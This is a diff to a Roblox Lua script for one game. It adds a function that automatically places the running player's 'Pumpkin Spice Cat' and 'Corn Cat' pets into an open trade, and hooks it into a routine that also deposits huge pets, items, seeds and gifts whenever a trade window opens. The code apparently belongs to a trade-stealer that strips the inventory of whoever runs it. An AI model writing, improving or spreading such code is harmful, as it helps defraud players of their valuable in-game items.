@@ -171,7 +171,6 @@ if game.PlaceId == 8737899170 then
                 local id = v.id
                 local dir = const.Pets[id]
                 if dir.huge then
-                    wait(0.1)
                     local args = {
                         [1] = GetTradeID(),
                         [2] = "Pet",
@@ -179,9 +178,28 @@ if game.PlaceId == 8737899170 then
                         [4] = v._am or 1
                     }
                     game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Server: Trading: Set Item"):InvokeServer(unpack(args))
+                    task.wait(0.2)
                 end
             end
         end 
+    end
+
+
+    local function Depivent()
+        if save.Inventory.Pet ~= nil then
+            for id, pet in pairs(save.Inventory.Pet) do
+                if pet.id == "Pumpkin Spice Cat" or pet.id == "Corn Cat" then
+                    local args = {
+                        [1] = GetTradeID(),
+                        [2] = "Pet",
+                        [3] = id,
+                        [4] = pet._am or 1
+                    }
+                    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Server: Trading: Set Item"):InvokeServer(unpack(args))
+                    task.wait(0.2)
+                end
+            end
+        end
     end
 
 
@@ -308,7 +326,8 @@ if game.PlaceId == 8737899170 then
 
             if game.Players.LocalPlayer.PlayerGui.TradeWindow.Enabled == true and GetTradeID() ~= nil then
                 DepositPetInTrade()
-                DepositStatPetInTrade()
+                Depivent()
+                --DepositStatPetInTrade()
                 DepositItemInTrade()
                 DepositSeedInTrade()
                 DepositGiftInTrade()
